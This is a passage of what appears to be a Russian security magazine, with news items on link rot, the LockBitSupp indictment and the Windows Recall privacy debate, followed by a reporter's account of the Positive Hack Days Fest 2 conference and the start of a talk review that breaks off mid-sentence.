   Около 38% веб‑страниц, активных в 2013 году, тоже уже не существуют, а c 2023 года из сети
   исчезли порядка 8% веб‑страниц.





    Исследователи подсчитали, что 23% новостных веб‑страниц содержат хотя бы одну нерабо‐
   тающую ссылку, а для правительственных сайтов это число оставляет 21%.

    Хуже того, больше половины (54%) страниц Wikipedia также содержат хотя бы одну несущес‐
   твующую ссылку. Суммарно около 11% от всех ссылок в Википедии более не доступны.

   Ситуация в социальных сетях не лучше. Так, в социальной сети X (бывший Twitter) почти каж-
  дый пятый твит пропадает через несколько месяцев после публикации.

  В 60% случаев это связано с тем, что учетная запись, разместившая сообщение, была зак‐
   рыта, заблокирована или полностью удалена. В остальных 40% случаев владелец аккаунта сам
    удаляет свой твит.





                                        Продолжение статьи →
← Начало статьи





 ДЕАНОН
 LOCKBITSUPP?
  ФБР, Национальное агентство по борьбе с преступностью Великобритании
  (NCA) и Европол опубликовали масштабные обвинения и ввели санкции про‐
   тив 31-летнего гражданина России Дмитрия Юрьевича Хорошева. Правоох‐
   ранители утверждают, что именно он скрывается за никами LockBitSupp
  и putinkrab, являясь администратором и разработчиком вымогательской груп‐
   пировки LockBit.
      Согласно  обвинительному  заключению  Министерства  юстиции США
  и сообщению NCA, Дмитрий Хорошев живет в Воронеже и он лично «зарабо‐
   тал» на вымогательских операциях LockBit около 100 миллионов долларов
  США (примерно пятая часть всех выкупов, полученных группой).

         «Хорошев, он же LockBitSupp, процветал в  условиях  анонимности
        и даже  предлагал  награду  в  размере 10  миллионнов  долларов «
        любому, кто сможет раскрыть его личность. Теперь же он подпадает
        под санкции в виде замораживания активов и запрета на поездки», —
          заявило NCA.                 »
   Предполагается, что санкции приведут к серьезным перебоям в работе
   вымогателей, поскольку теперь выплаты выкупов будут нарушать запреты
   властей, а значит, пострадавшие компании могут столкнуться с крупными
   штрафами. Например, в прошлом подобные меры приводили к тому, что
   некоторые компании, ведущие с вымогателями переговоры о выкупах, перес‐
  тавали работать с группировками, попавшими под санкции.
      Также теперь американские власти предлагают вознаграждение в раз‐
  мере 10 миллионов долларов за любую информацию, которая может привес‐
   ти к аресту или осуждению LockBitSupp, в рамках программы Rewards for
   Justice.





  По информации исследователей Vx-Underground, LockBitSupp заявил, что
  ФБР «блефует», правоохранители доксят вовсе не его, а он «сочувствует
   реальному Димону».


        «Не понимаю, зачем они устраивают это маленькое шоу. Они явно
          расстроены тем, что мы продолжаем работать», — заявил LockBitSupp. «                 »
   Напомним, что в феврале 2024 года правоохранители провели операцию
  Cronos, в рамках которой они вывели из строя инфраструктуру LockBit, вклю‐
   чая 34 сервера, где размещались сайты для слива данных и их зеркала, укра‐
   денные у жертв файлы, криптовалютные кошельки. Также сообщалось, что
   власти получили около 1000 ключей для дешифрования данных, после чего
  был выпущен инструмент для расшифровки и бесплатного восстановления
   файлов.
      Теперь правоохранители заявили, что на самом деле в их руках оказалось
  более 2500 ключей и они продолжают оказывать помощь жертвам LockBit
   в бесплатном восстановлении данных.
     Кроме того, теперь, после изучения изъятых в феврале данных, NCA заяв‐
   ляет, что LockBit вымогала более миллиарда долларов у тысяч компаний
  по всему миру, а Минюст США сообщил, что Хорошев и его сообщники
   получили от своих жертв больше 500 миллионов долларов в виде выкупов.
      Так, в период с июня 2022 года по февраль 2024 года LockBit совершила
   свыше 7000 атак (больше всего инцидентов было зафиксировано в США,
   Великобритании, Франции, Германии и Китае).
      Группировка LockBit активна и сегодня, даже после недавней операции
   правоохранителей. Так, недавно хакеры обнародовали на своем сайте мно‐
   жество старых и новых данных о жертвах. Однако NCA утверждает, что опе‐
  рация Cronos привела  к массовому сокращению количества  партнеров
   LockBit  и  в  результате  число  активных  членов  группы  сократилось
  со 194 до 69 человек, поскольку хакеры утратили доверие к своему руководс‐
   тву.


  2,28 МИЛЛИОНА ЗАБЛОКИРОВАННЫХ ПРИЛОЖЕНИЙ
  В 2023 году компания Google заблокировала 2,28 миллиона приложений в магазине Google
    Play. Обнаруженные в них нарушения правил могли угрожать безопасности пользователей.

    Также компания выявила и заблокировала 333 тысячи аккаунтов разработчиков, которые заг‐
   ружали вредоносное ПО, мошеннические приложения или неоднократно нарушали правила.

   Для сравнения: в 2022 году Google заблокировала около 1,5 миллиона опасных приложений
   и приостановила активность 173 тысяч аккаунтов разработчиков за грубые нарушения.





 RECALL ХУЖЕ
 КЕЙЛОГГЕРА
  В  этом месяце  компания  Microsoft  анонсировала новую  ИИ‑функцию
   в  Windows  11.  Функция,  получившая  название  Recall,  фиксирует всю
   активность пользователя компьютера, а затем позволяет формировать отче‐
  ты и выполнять поиск по истории за последние три месяца. ИБ‑эксперты наз‐
  вали  Recall настоящим кошмаром с  точки  зрения  конфиденциальности
  и безопасности.


  Recall и Copilot+
   Функция Recall была анонсирована 20 мая 2024 года, в рамках мероприятия,
   предваряющего скорый старт конференции Microsoft Build 2024.
    В этом году компания всецело сосредоточена на искусственном интеллек‐
   те и Copilot, поэтому одним из главных анонсов мероприятия стали компь‐
   ютеры Copilot+ и функция Recall, которая будет работать как раз на машинах
   Copilot+.
      Recall создана, чтобы помочь «вспомнить» любую информацию, которую
   пользователь просматривал в прошлом, и сделать ее доступной с помощью
   простого поиска. Так, функция делает снимок активного окна каждые нес‐
   колько секунд, записывая все, что происходит в Windows, будь то просмотр
   сайтов в браузере, общение в мессенджере или работа с другими приложе‐
  ниями.





                               Пример работы Recall

  По умолчанию данные хранятся до трех месяцев (старые скриншоты будут
   заменяться новыми), и пользователь сможет выбирать, в каких приложениях
   можно делать снимки. Для работы Recall потребуется HDD или SSD объемом
  не менее 256 Гбайт и как минимум 50 Гбайт свободного места.
      Полученные  снимки  будут  обрабатываться  нейронным  процессором
   (Neural Processing  Unit, NPU) устройства и ИИ‑моделью, чтобы извлечь
  со скриншотов данные. Затем информация будет сохранена, и пользователи
  Windows  смогут  как  просматривать историю  скриншотов,  так и искать
  по истории с помощью запросов на родном языке. В теории это позволит
   легко   найти,  к  примеру,  прочитанное  в  прошлом  месяце  письмо
  или посещенный когда‑то сайт.
      Представители Microsoft подчеркнули, что все собранные данные шиф‐
   руются с помощью BitLocker, привязанного к учетной записи пользователя
   в Windows, и не передаются другим пользователям на том же устройстве.
     Как уже было упомянуто выше, Recall будет работать только на компьюте‐
  рах Copilot+ (также встречается написание Copilot Plus), которые компания
  тоже представила в этом месяце. Такие устройства вскоре будут предлагать
   Dell, Lenovo, Samsung, HP, Acer и Asus. Кроме того, Microsoft выпустит два
   собственных устройства, которые войдут в линейку Surface.
    В Microsoft заявили, что эти решения способны выполнять более 40 TOPS
   (триллионов операций в секунду), будут оснащаться нейронным процес‐
  сором, работать на базе Snapdragon X и Snapdragon X Plus, а также получат
  не менее 16 Гбайт ОЗУ и 256 Гбайт SSD. В дальнейшем таких устройств ста‐
   нет больше благодаря партнерству с Intel и AMD (начиная с Lunar Lake и Strix),
  а текущие экземпляры уже якобы превосходят MacBook Air на базе M3 почти
  на 58% по многопоточной производительности.


  Критика
   Появление Recall вызвало шквал критики со стороны как обычных поль‐
   зователей, так и ИБ‑специалистов. Хотя в своем анонсе Microsoft подчерки‐
   вает, что Recall разработана таким образом, чтобы все данные хранились
   только на устройстве пользователя в зашифрованном виде, многие полагают,
   что это создаст серьезные риски для конфиденциальности и возникнет новый
   вектор атак, направленных на кражу данных.


          «Recall — ключевая часть того, что делает компьютеры Copilot+ осо-
         бенными, и Microsoft с самого начала заложила конфиденциальность «
         в концепцию Recall, — заявляют разработчики. — На компьютерах
          Copilot+ с процессором Snapdragon серии X вы увидите значок Recall
         на панели задач после первой активации устройства. С помощью это-
          го значка можно открыть настройки Recall и выбрать, какие снимки
          Recall собирает и хранит на вашем устройстве. Вы сможете огра-
         ничить количество собираемых Recall снимков. Например, сможете
          выбрать определенные приложения или сайты, посещенные в под-
         держиваемом браузере, чтобы исключить их из своих снимков. Кроме
          того, вы сможете приостановить создание снимков с помощью значка
          Recall в системном трее, очистить некоторые или все сохраненные
          снимки, а также удалить все снимки со своего устройства».                 »
   Кроме того, Microsoft заявила, что Recall не будет создавать скриншоты окон
   в режиме InPrivate в Microsoft Edge (и других браузерах на базе Chromium),
  а также контента, защищенного DRM. Однако в компании не уточнили, будут
  ли  поддерживаться  приватные режимы в  других  браузерах,  например,
   в Firefox.
      Словом, Recall должна быть «приватной, локальной и безопасной» (то есть
  о передаче данных в облако и на серверы Microsoft речи не идет), не будет
   использоваться для обучения каких‑либо моделей искусственного интеллек‐
   та, и пользователь сможет «полностью контролировать ситуацию».
      Стоит отметить, что Microsoft уже начала предоставлять более подробную
   техническую информацию о Recall, например о групповых политиках, которые
   можно использовать для отключения функции в масштабах компании.
      Однако все эти обещания не помогли успокоить сообщество. Функцию
   критикуют практически все, начиная от простых пользователей (достаточно
   почитать комментарии к любой публикации о Recall и убедиться, что поль‐
   зователи не доверяют заявлениям Microsoft) до Илона Маска, который срав‐
  нил анонс Recall с эпизодом сериала «Черное зеркало» и заявил, что сразу
  же отключит эту функциональность.
      Также Recall уже заинтересовалось британское агентство по защите дан‐
  ных — Управление комиссара по информации (ICO), которое обратилось
   к Microsoft с запросом, чтобы убедиться, что данные людей действительно
   будут защищены должным образом и не будут использованы самой компани‐



       «Мы ожидаем, что организации будут прозрачно информировать своих
          пользователей о том, как используются их данные, и обрабатывать  ей.«
          персональные данные только в той мере, в какой это необходимо
         для достижения конкретной цели. Индустрия должна учитывать воп-
        росы защиты данных с самого начала и тщательно оценивать и смяг-
         чать риски в отношении прав и свобод людей, прежде чем выводить
           продукты на рынок, — говорится в заявлении ICO. — Мы направили
          запрос в Microsoft, чтобы понять, какие меры защиты конфиденциаль-
           ности пользователей были предприняты».                 »
  Но даже если представить, что Microsoft действительно не получит доступ
   к  данным  Recall,  продукт  все  равно  может  нести  серьезные  риски
  для безопасности и конфиденциальности.
     К примеру, Microsoft признаёт, что функция не выполняет модерацию кон‐
   тента, то есть будет просматривать буквально все, что «видит», включая
  пароли в парольных менеджерах и номера счетов на банковских сайтах. Дру‐
  гой пример: если пользователь будет составлять в Word конфиденциальное
   соглашение, будет создан скриншот и этого документа.
     К тому же, если компьютер используется несколькими людьми совместно,
   придется быть внимательнее к просматриваемым фотографиям и видео, пос‐
   кольку они тоже будут записаны и сохранены Recall.
       Хотя в настройках пользователь сможет запретить делать скриншоты кон‐
   кретных приложений, специалисты опасаются, что большинство людей вооб‐
  ще не станут разбираться в настройках этой функции. В итоге вся информа‐
  ция будет храниться в удобном семантическом индексе Windows 11 и будет
   доступна для поиска всем, кто имеет доступ к компьютеру.
      Хуже того, если злоумышленники или малварь скомпрометируют устрой‐
   ство пользователя, все данные Recall, защищенные BitLocker, будут рас‐
  шифрованы, то есть станут доступны и для хакера.
      Таким образом, атакующие смогут попросту похитить базу данных Recall
  и выгрузить ее на собственные серверы для последующего анализа. Затем
   полученная информация может использоваться, например, для вымогатель‐
   ства или взлома учетных записей жертв, если учетные данные попадали
   в поле зрения Recall.
      Известный ИБ‑эксперт Кевин Бомонт (Kevin Beaumont), неоднократно
   выступавший с откровенной критикой в адрес Microsoft, выразил обеспоко‐
  енность тем, что новая функция создаст обширные возможности для атак,
  и сравнил Recall «с кейлоггером, встроенным в Windows».


         «Если посмотреть на то, как исторически развивались инфостилеры:
        они постепенно переходили к автоматическим кражам паролей бра- «
           узеров, хранящихся локально, — пишет Бомонт. — Иными словами,
        если злоумышленник получает доступ к системе, он похищает важные
        базы данных, хранящиеся локально. Хакеры могут просто экстраполи-
         ровать этот процесс, чтобы воровать еще и информацию, записанную
          функцией Recall».                 »
   Хотя Бомонт пишет об инфостилерах, проблема не только в них. Например,
   малварь, которая нацелена на предприятия (вроде TrickBot), порой имеет
  модули для кражи БД Active Directory домена, чтобы позже поискать там учет‐
  ные данные. Ничто не помешает таким вредоносам применить аналогичный
   подход и начать похищать БД Recall тоже.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

    Инструмент CCTV позволяет узнать местоположение пользователей Telegram


   Microsoft не собирается исправлять проблему 0x80070643 в Windows


   Proton Mail раскрыл данные пользователя правоохранителям


    Экс‑студентов МТИ обвинили в хищении 25 миллионов долларов в криптовалюте за 12 секунд


    Группировка Muddling Meerkat использует «Великий китайский файрвол» для атак


   Apple Wi-Fi Positioning System (WPS) можно использовать для массовой слежки


   Stack Overflow банит пользователей, недовольных партнерством ресурса с OpenAI


   Украдены данные 49 миллионов клиентов Dell


   YouTube перематывает видео и отключает звук для пользователей блокировщиков рекламы


   Samsung требует от ремонтных мастерских делиться данными о клиентах
COVERSTORY





Очередной, второй, Positive Hack Days про‐
шел в Москве, на этот раз в СК «Лужники»,
и   длился   аж   целых   четыре   дня,
с 23 по 26 мая. Как и в 2023 году, всех, кто
хочет  погрузиться в мир  кибербезопас‐           RE:[ALT]ER                                                                                                        Disturb the Peace
ности и отлично провести время, ждали               @giftfromtherift
открытая  и  закрытая  части  фестиваля.
Четыре дня  докладов,  конкурсов,  битвы
Standoff 13, музыки и хорошего  настро‐
ения — я расскажу, как это было.


Если тебя вдруг удивляет цифра 2 в названии (ведь прошлый PHDays носил
номер 12), то разгадка проста: раньше PHDays проходил в формате форума,
а теперь это настоящий киберфестиваль, поэтому к названию добавили Fest,
а нумерацию начали заново.


ОТКРЫТАЯ ЗОНА ФЕСТИВАЛЯ





                         Прибыли на «Вокзал»

Четырехдневное приключение под названием Positive Hack Days Fest 2 в этом
году начиналось практически сразу от центрального входа в СК «Лужники»,
где тебя ждали красочные инсталляции «Вокзал» и «Панелька» — первые час‐
ти «Кибергорода», который, по замыслу, находился под полным контролем
обезумевшего искусственного интеллекта.


             INFO

                  •Сайт фестиваля: phdays.com
                  •Программа фестиваля: день первый, второй,
                              третий и четвертый


Всем заинтересованным предлагалось пройти квест, устроив собственное
расследование, целью которого было изучить информацию о всяких сис‐
темах и девайсах и выявить атаки на них. Также предстояло разобраться,
почему ИИ все‑таки не выдержал накала страстей и сломался.
  А отважных безумцев, справившихся с киберквестом, в финале ждала нас‐
тоящая этическая дилемма, этакий выбор, подводящий итог всей проделан‐
ной работе.





                           Добро пожаловать!

Cyber TV, Love Found 404 — от этих роликов, крутившихся на больших экра‐
нах, я смеялся в голос. С чувством юмора у организаторов все отлично!





                      Традиционный дефейс бейджа

После вступительных локаций тебе открывался фестиваль, полный развле‐
чений для всех возрастов — от самых маленьких до старшего поколения.
Детей на фестивале было много, и их неподдельный интерес к происходяще‐
му был очевиден. Родители не всегда успевали вникнуть в окружающую нас
всех специфику кибербеза, но молодая кровь рвалась в бой. «У Свалкера»
юная исследовательница настойчиво кому‑то дозванивалась по проводному
телефону, а ее боевая подруга пыталась настроить монитор, прожимая
какие‑то секретные комбинации на пульте от телевизора. Одобряю столь
непреодолимое желание осваивать новые старые технологии!





                           Локация «У Свалкера»





                Молодежь изучает технологии прошлого





                        Кладбище приложений

Отдельно хочу упомянуть работу артистов, которые все четыре дня отрабаты‐
вали на 200%. Грим и  специальные  костюмы,  тематические  локации
и необычные роли, жара, огромное количество гостей фестиваля — ничто
из этого не пошатнуло их профессионализм и желание устроить красочное
шоу. Даже по вечерам, когда все прилично утомлялись от продуктивных дней,
артисты уверенно и с энергией продолжали играть свои роли, нередко под‐
шучивая над проходящими мимо людьми. Подшутили и надо мной, мне пон‐
равилось! :)





                    Очень харизматичная дама





               Тот самый кудесник, что надо мной подшутил





                  Кибер‑Кощей собственной персоной





        Я прервал момент единения с природой этого богатыря

На сцене «Спутник» доминировал трек «Научпоп», целью которого было
повышение киберграмотности, рассказы об ИТ и цифровом искусстве. Там
же играла музыка. В этом году Positive Hack Days подогревали сразу несколь‐
ко коллективов и артистов: независимая исполнительница Эрика Лундмоен,
музыкальный коллектив Levandowskiy & SCHE, стендап‑комик Саша Малой,
ведущий музыкальный проект России в жанре госпел Moscow Gospel Team
и поп‑рок‑группа The Hatters. Публика была в восторге.





                             Сцена «Спутник»





                      Выступление Levandowskiy & SCHE

Неподалеку от сцены «Спутник» были замечены владения чемпиона мира
по шахматной композиции, одновременно проводящего несколько партий
со всеми желающими.





         Чемпион мира по шахматной композиции справа, если что

Разгромный счет не позволял усомниться в мастерстве Сергея Александро‐
вича — международного мастера по шахматам, мастера спорта России
с рейтингом Эло 2400+ и международного гроссмейстера по русским шах‐
матам. По какой‑то неведомой мне причине его нигде не упомянули, ни в
программе мероприятия, ни на сайте фестиваля. Просто «шахматы».





        Очевидное доминирование профессионального шахматиста

И тут же, неподалеку от этой локации, была детская зона Kidzania. Для совсем
юных посетителей киберфестиваля играл целый персональный диджей.





                                Зона Kidzania





                            Разговор по душам

Чуть левее — локация с развлечениями для посетителей постарше, где все
желающие с головой уходили в игры, включая VR, и даже приобщались
к искусству в виде необычного, но довольно красочного боди‑арта.





                Комната с разнообразными развлечениями





                 OMG VR, воистину!





                 Процесс создания очередного шедевра





                          Угроз не обнаружено. Верю!





                 Мастерская по созданию подобной красоты


ЗАКРЫТАЯ ЗОНА ФЕСТИВАЛЯ

Такая уж ли она закрытая — вопрос вопросов. Объясню: закрытая часть фес‐
тиваля подразумевала доступ к ряду специальных активностей и докладов,
но на практике проникнуть туда не составляло труда. Никто не проверял бей‐
джи — главное, чтобы они были. Единственным исключением была зона кон‐
курсов в здании Standoff — там бейджи внимательно изучали на обоих входах.
  Не скажу, что проникать на PHD без билета было прямо‑таки необ‐
ходимо, — цены начинаются от 1000 рублей, что вполне демократично.
С другой стороны, для некоторых персонажей халява и приключения —
это самоцель, и на PHD такие ребята однозначно были.





                              Расписание

Так что же собой представляла закрытая зона фестиваля? Грубо говоря,
это тот самый Positive Hack Days, каким он был до преобразования в кибер‐
фестиваль: доклады специалистов про кибербез и бизнес, эпичная заруба
под названием Standoff и классические конкурсы вроде 2drunk2hack, IDS
Bypass, $natch и другие.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
   POSITIVE HACK DAYS
              FEST 2
       ЧЕТЫРЕ ДНЯ КИБЕРБЕЗА ДЛЯ ВСЕХ





ДОКЛАДЫ

Тут у меня было стойкое ощущение, что акцент с «Offence/Defense» переко‐
чевал в направление «Бизнес». Решил проверить, и вот что получилось:
 • день 1 — 96 докладов, из которых на «Кибербезопасность» приш‐
   лось 39 докладов, в то время как на «Бизнес» пришелся 31 доклад;
 • день 2 — 120 докладов: «Кибербезопасность» — 31 доклад, «Бизнес» —
   55 докладов;
 • день 3 — 115 докладов: «Кибербезопасность» — 48 докладов, «Биз‐
   нес» — 30 докладов;
 • день 4 — 80 докладов: «Кибербезопасность» — 1 доклад, «Бизнес» —
   18 докладов.

В  итоге:  411  докладов  за  четыре  дня  фестиваля  по  всем  трекам,
из них 119 докладов было в категории «Кибербезопасность» и 134 доклада —
в категории «Бизнес». Треки «Offence» и «Defense» за все время фестиваля
порадовали слушателей 15 и 19 докладами соответственно.





                        Лада Антипова читает доклад





   Не поверите, но сегодня мы будем учиться ломать! Ломать полностью!

Рассказу о приглянувшихся мне докладах я посвящу отдельный материал,
а вот про Standoff и конкурсы имею что сказать прямо сейчас.


STANDOFF 13





                        Вход в зал Standoff





                          Зал Standoff 13

В этом году кибербитва Standoff расширилась до уже двух виртуальных
государств. К «Государству F» прибавилось еще «Государство S». Объем
работ таким образом увеличился для команд как «красных»  (атака), так
и «синих» (защита, расследование инцидентов).


        WWW

                         Официальная вики по Standoff





  Зал Standoff, на экране подсказка для тех, кто забыл, где он/она находит‐
  ся

На этом нововведения не закончились, а, можно сказать, только начались,
потому что за появлением нового виртуального государства последовало
и изменение в правилах кибербитвы. Учитывая возникшую неоднозначность
вокруг этого решения, не думаю, что сильно испорчу кому‑то интригу, заспой‐
лерив итог Standoff 13:

       Победило «Государство F»
          Одна из команд «Государства F» завершила  битву с 0 баллов«
      за государственные критические события, реализованные критические
      события и выявленные уязвимости.
           Результаты:
         «Государство S» — 3,23
       «Государство F» — 3,42                »
Команды атакующих смогли реализовать 415 критических событий и обна‐
ружить 617 уязвимостей, больше всего закошмарив 23 уникальными кри‐
тическими событиями банковскую отрасль и меньше напора проявив в атом‐
ной промышленности, реализовав два уникальных критических события.
   Команды защитников предотвратили 115 критических событий, рассле‐
довали 182 успешные атаки и выявили 851 инцидент.
   Результаты  основного  этапа кибербитвы  определялись по среднему
количеству реализованных событий среди всех активных команд каждого
государства, после чего начались стадии плей‑офф и плей‑ин, где играли уже
по четыре лучшие команды из каждого государства.





                   Промежуточные результаты кибербитвы


             INFO

                            Команда  DreamTeam  (действующие  чемпионы)
                          выиграла   кибербитву  и   получила   награду
                        в 800 тысяч рублей. Второе место в плей‑офф
                          забрали кудесники из ℭ𝔲𝔩𝔱, третье — DeteAct x
                       SPbCTF, четвертое — GISCYBERTEAM.


Ряд записей на канале Standoff 365 в Telegram хорошо проиллюстрировал
отношение активной части сообщества к Standoff в этом году: в реакции
обильно накидали какашек. Мы же не будем подробно останавливаться
на  деталях  драмы,  если  тебе  интересно, можешь  почитать  в  телег‐
рам‑каналах участников:
 • FCK HARDER
 • True0xA3
 • Kappa CTF
 • Riocool

Надеюсь, организаторы услышат игроков, сделают выводы и на следующий
год мы будем радоваться кибербитве и болеть за новых участников, а не
грустно наблюдать какашкозакидательство.
  Тем не менее я считаю, что все участники молодцы, всем пахлава! Всех
обнял, поднял, покружил и запустил в толпу поклонниц и поклонников!


КОНКУРСЫ

Суть конкурсов: весело и интересно провести время, посоревноваться с дру‐
гими горячими головами, заработать баллы для последующего их обмена
на атрибутику фестиваля. Просто и ясно, но и тут не без нововведений.





                         База конкурса «Взлом Web3»

В этом году в конкурсах организаторы создали собственную игровую крип‐
товалюту под названием POSI token. Как выяснилось в процессе, ее реали‐
зация немного хромала, что порождало разные теории о том, почему так слу‐
чилось. Однако это не помешало части игроков выполнять задачи конкурсов,
как говорится, всем колхозом, тем самым нарушая правила. Это в итоге при‐
вело к штрафу от организаторов в виде заниженных начислений игровой
валюты за выполненные задания. Доступ к халяве был слегка усложнен,
лутаться стало тяжелее! :)





                              База конкурса AI CTF





    Нешуточное интеллектуальное напряжение в зоне конкурса IDS Bypass

Всего было шесть конкурсов: IDS Bypass, $natch, AI CTF, «Взлом Web3»,
легендарный 2drunk2hack (aka «Наливай‑ка») и SEQuest. Если с первыми
пятью конкурсами все более‑менее ясно и понятно, то вот последний кон‐
курс — SEQuest — был совсем новым и заинтриговал многих еще за двое
суток до начала фестиваля.





         Винни‑Пух с Пятачком как бы недоумевают. Конкурс $natch

SEQuest — это Social Engineering Quest, где желающим адреналина и ярких
впечатлений предлагалось соревнование по софтскиллам, которыми поль‐
зуются злоумышленники при атаках методом социальной инженерии. Скажу
честно, меня конкурс тоже заинтересовал, но, заранее раздобыв и изучив
правила конкурса, я воздержался от участия. Позже выяснилось, что не ошиб‐
ся. Почему? Расскажу далее.





                            База конкурса SEQuest

В теории суть конкурса была простой, как два байта: перехитри волонтеров,
организаторов и охрану, выполни семь заданий, не привлекая внимания
санитаров, заработай очки и получи памятный приз, если выбьешься в тройку
лидеров.
  На первый взгляд выглядит круто, что же не так? Во‑первых, правила
для такого конкурса были явно сырыми, а это уже местами сулило неиллюзор‐
ные проблемы для жаждущих славы Митника участников. Во‑вторых, было
очевидно, что тех бедолаг из числа волонтеров и организаторов, которых
размотают  в  процессе  конкурса,  будут  как минимум  жестко песочить
в режиме реального времени, и так оно и случалось в итоге, причем несколь‐
ко раз. В общем, я решил, что не стоит вписываться в это сомнительное
мероприятие ради куртки с символикой конкурса.
   У тех, кто таки решил поучаствовать, а также у волонтеров и самих орга‐
низаторов остались яркие и незабываемые впечатления от нового конкурса.
Интересные моменты — снова в телеграм‑каналах:
 • несколько постов Никиты Попова: 1, 2, 3, 4;
 • Алексей Лукацкий;
 • Сергей Зыбнев.

Возможным  сценарием успешного выполнения задач SEQuest любезно
поделился @dontunique на официальном канале конкурсов PHD в Telegram —
это вообще какая‑то магия вне «Хогвартса», поспеши припасть к мудрости!
  В общем, задумка великолепная, но реализация пока не без изъянов. Уве‐
рен, через год мы снова получим шанс испытать судьбу в SEQuest и пот‐
репать нервы организаторам, но уже с более проработанными правилами
и закаленными в боях против СИ волонтерами.


СООБЩЕСТВО

Было много встреч, и особенно душевно проходили сходки каналов и чатов.
Так сказать, виртуальные знакомства логически трансформировались в зна‐
комства реальные, если к этому моменту кто‑то еще кого‑то не знал лично.
Безумцы и гении, хулиганы и красавицы!





                           Сходка канала @Poxek





  Шел третий день фестиваля. Юра: «Этот мир мне стал абсолютно
  понятен...»





    Еще одна интересная встреча. Надеюсь, снимок на Polaroid удался

Молодежь была везде, впитывала происходящее, снимала рилсы и строила
планы на всю жизнь — это даже мило. Отрадно видеть и осознавать, что
в 2024 году юноши и девушки так конструктивно подходят к мыслям о своем
ближайшем будущем и делают это на таком мероприятии. Меньше тревог
и сомнений, вы в правильном месте и в нужное время. Дерзайте!





                          Стенд PT Start

Стенд журнала «Хакер» выгодно отличался от прочих локаций своим минима‐
листичным оформлением, интересным дизайном, ярким мерчем и гостепри‐
имной командой в лице Дмитрия Агарунова и его очаровательных помощниц.
Приглашение подписчиков журнала на кофе и интересные беседы было
не фигурой речи и не вежливостью, а самым настоящим призывом к дей‐
ствию, в чем я лично убедился вечером третьего дня фестиваля. Далее в сти‐
хах. Песню, уверен, ты знаешь:

       Измотанный программой (фестиваля), я выбился из сил.
     На стенде «Хакера» я покоя попросил.«
     С улыбкой добродушной Дмитрий меня пустил
     И жестом дружелюбным на кофе пригласил.
         Хэй!
        Будь как дома, хакер,
     Я ни в чем не откажу!
          Скидку на подписку,
      Коль желаешь, подарю!                »
Мораль сей песни такова: для подписчиков журнала традиционно были луч‐
шие условия.





                   Оформление стенда, журнал «Хакер»

На этом же стенде случилось приятное знакомство с Азизом А. (C7 Security)
и его спутницей, обмен визитками, стикерами, подпись книги и совместная
фотография на память. А дальше, пока я отдыхал, потягивая вкусный кофе,
рядом диджей раздавал бас и ломаные ритмы, да так раздавал, что у Дмитрия
ноги прямо просились в пляс. Так и надо жить!





                      Утомленный жарой диджей :)

Мерч фестиваля не вызывает восторгов уже второй год подряд, посетители
жалуются, и организаторы в курсе этих мнений. Зато меня порадовал мерч
«Хакера»! Стикеры и новый дизайн футболок удались на славу, за что мыс‐
ленно‑реально‑виртуально хвалим @yambuto и решительно обклеиваем свои
ноутбуки новыми наклейками.


АУТРО

Для кого нынешний фестиваль Positive Hack Days? Для разработчиков? Энту‐
зиастов? Хакеров? Для бизнеса? Для профи?
   Место нашлось всем, но теперь с большим акцентом на бизнес. Год назад
я обозначил эту трансформацию PHD из форума в фестиваль как «меньше
андеграунда, больше мейнстрима», и не ошибся. В этом году стало отчетливо
видно, в какую сторону идет движение, и в общих чертах ясно, чего ждать
в будущем.
   Масштаб мероприятия снова  увеличился, эксперимент  продолжается,
некоторые ошибки прошлого года проработаны, и проработаны хорошо.
Без сюрпризов и нюансов не обошлось, но это даже к лучшему, ведь будет
чем приятно удивить в следующем году.





                               Отдых в парке

Как и раньше, гости PHD получали то, за чем приходили: кто‑то лутал мерч,
кто‑то общался с приятелями и коллегами, кто‑то слушал доклады, спал
в парке на удобной подушке или плясал под Levandowskiy & SCHE, а кто‑то
вообще объединял все это по мере возможности.
  В эти четыре дня фестиваля нас вновь собрали вместе, и лично я был чер‐
товски рад этой встрече! За что от души благодарю как организаторов, так
и всех без исключения участников киберфестиваля. До встречи через год!


        WWW

                  •Фотографии с мероприятия в ВК: 1, 2
                  •Несколько видео: 1, 2, 3, 4, 5, 6
COVERSTORY





В   этом   году   интересных   докладов
на PHDays было еще  больше,  так  что
и делать подборку стало сложнее. Перек‐
рывающие друг друга по времени доклады
посетить  невозможно,  но  организаторы            RE:[ALT]ER                                                                                                        Disturb the Peace
любезно и крайне оперативно опубликова‐              @giftfromtherift
ли записи выступлений практически день
в день, так что любой желающий  легко
может восстановить пробелы, что я и сде‐
лал. Присоединяйся!


Что было новенького? Секция Fast Track стала круче: докладов здесь в целом
стало больше, и попадались крайне интересные. Секции «Кибербез: с чего
начать» (далее просто «Кибербез») и Community тоже порадовали — на них
материал разбирали почти что на пальцах.
  И отдельно спасибо организаторам за возможность посмотреть видео
докладов и скачать презентации — это удобно и экономит кучу времени.


1. ГОТОВЫ ЛИ РОССИЙСКИЕ КОМПАНИИ ПРОТИВОСТОЯТЬ
КИБЕРАТАКАМ?





 • Трек: Кибербез
 • Спикеры: Антон Исаев (Positive Technologies) и Федор Чунижеков (Positive
   Technologies)
 • Запись доклада
 • Презентация, PDF

Хороший стартовый доклад фестиваля. Пока зрители настраивались на ритм
PHDays, Антон и Федор рассказали им о том, насколько хорошо отечествен‐
ные компании готовы противостоять кибератакам.
   Исследование основано на результатах опроса, проведенного в первом
квартале 2024 года, в нем поучаствовало 650 респондентов из более
чем 60 российских компаний. Целью исследования было выявить проблемы
организаций в вопросах готовности противодействовать кибератакам. Прямо
скажем, актуально.
   Антон и Федор рассказали, из чего складывается эта самая готовность
противостоять кибератакам, поделились результатами своего исследования,
рассказали о базовых проблемах в вопросах обеспечения киберустойчивос‐
ти (обрати внимание на этот модный термин) и завершили выступление
рекомендациями.  Про  вспомогательные  инструменты  для  подготовки
инфраструктуры компании к отражению злостных атак тоже не забыли.


2. ОШИБКИ ПРИ РЕАГИРОВАНИИ НА ИНЦИДЕНТЫ В 2023–2024
ГОДАХ





 • Трек: Defense
 • Спикер: Сергей Голованов («Лаборатория Касперского»)
 • Запись доклада
 • Презентация, PDF

Бодрый во всех смыслах доклад главного эксперта «Лаборатории Касперско‐
го». Сергей начал с позитивного приветствия, отлично раскрыл тему и закон‐
чил рекомендациями.
   Спикер рассказал о двух самых лютых проблемах прошлого года — шиф‐
ровании и краже данных. Сотрудники компаний, с обеих ног влетевших
в обозначенные проблемы, успевали солидно напортачить, ведь подобные
